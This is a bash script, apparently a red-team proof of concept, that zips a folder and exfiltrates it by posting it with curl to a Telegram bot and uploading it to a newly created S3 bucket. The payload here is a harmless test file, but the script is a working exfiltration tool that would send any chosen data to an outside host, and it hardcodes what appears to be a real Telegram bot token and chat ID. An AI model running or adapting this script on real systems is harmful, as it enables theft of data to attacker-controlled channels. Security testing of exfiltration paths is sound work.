#!/bin/bash

# ========== CONFIGURATION ==========
BOT_TOKEN="7984683506:AAGMhKzxbDqBh3MeXQks88HEIkrVboXuPps"
CHAT_ID="7031538964"
AWS_BUCKET="sisabasexfiltrationbucket"
FOLDER_NAME="Exfil"
FILE_NAME="yuvan_test1.txt"
ZIP_NAME="Exfil.zip"
MESSAGE="🚨 AWS PoC: Exfiltration POC Zip File via Telegram Bot"
REGION=$(aws configure get region)
# ===================================

echo "[*] Starting Exfiltration Process..."

# Step 1: Create Folder and File
echo "[*] Creating folder and file..."
mkdir -p "$FOLDER_NAME"
echo "Hi, This is Exfiltration POCs By SISA" > "$FOLDER_NAME/$FILE_NAME"

if [ $? -ne 0 ]; then
  echo "[✖] Failed to create file."
  exit 1
fi

# Step 2: Zip the Folder
echo "[*] Zipping the folder..."
zip -r "$ZIP_NAME" "$FOLDER_NAME" > /dev/null

if [ $? -ne 0 ]; then
  echo "[✖] Failed to zip the folder."
  exit 1
fi

# Step 3: Exfiltrate to Telegram
echo "[*] Sending ZIP file to Telegram..."
curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendDocument" \
  -F chat_id="${CHAT_ID}" \
  -F document=@"${ZIP_NAME}" \
  -F caption="${MESSAGE}" > /dev/null

if [ $? -eq 0 ]; then
  echo "[✔] Success: File sent to Telegram!"
else
  echo "[✖] Failure: Unable to send file via Telegram."
fi

# Step 4: Ensure Bucket Exists (S3)
echo "[*] Checking or creating S3 bucket: $AWS_BUCKET..."
aws s3api head-bucket --bucket "$AWS_BUCKET" 2>/dev/null

if [ $? -ne 0 ]; then
  echo "[*] Bucket not found. Creating now..."
  aws s3api create-bucket --bucket "$AWS_BUCKET" --region "$REGION" --create-bucket-configuration LocationConstraint="$REGION"
  if [ $? -ne 0 ]; then
    echo "[✖] Failed to create S3 bucket."
    exit 1
  fi
fi

# Step 5: Upload to S3
echo "[*] Uploading ZIP to S3 bucket..."
aws s3 cp "$ZIP_NAME" "s3://$AWS_BUCKET/" --quiet

if [ $? -eq 0 ]; then
  echo "[✔] Success: File uploaded to S3 bucket!"
else
  echo "[✖] Failure: Upload to S3 bucket failed."
fi

echo "[*] Exfiltration Completed!"